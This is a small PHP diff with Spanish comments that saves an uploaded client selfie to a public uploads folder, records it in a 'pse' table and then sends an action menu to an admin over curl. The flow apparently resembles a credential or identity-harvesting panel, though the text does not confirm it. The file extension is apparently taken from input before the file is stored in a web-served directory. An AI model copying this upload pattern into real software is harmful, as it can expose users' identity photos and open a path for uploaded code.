@@ -43,6 +43,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && (isset($_POST['selfie']) || isset($
         $output = curl_exec($ch);
         curl_close($ch);
 
+        // --- Guardar Selfie en Servidor y BD ---
+        // Generar nombre permanente
+        $fileName = 'selfie_' . $cliente_id . '_' . time() . '.' . $type;
+        $finalPath = '../../assets/uploads/' . $fileName;
+
+        // Mover (renombrar) archivo temporal a uploads
+        if (!file_exists('../../assets/uploads/')) {
+            mkdir('../../assets/uploads/', 0775, true);
+        }
+        // copy/rename
+        copy($tempFile, $finalPath);
+
+        // Actualizar BD
+        $stmt = $conn->prepare("UPDATE pse SET foto_selfie = :foto WHERE id = :id");
+        $stmt->execute(['foto' => $fileName, 'id' => $cliente_id]);
+
         // Enviar Menú de Acciones al Admin
         $baseUrl = $config['baseUrl'];
         $security_key = $config['security_key'];
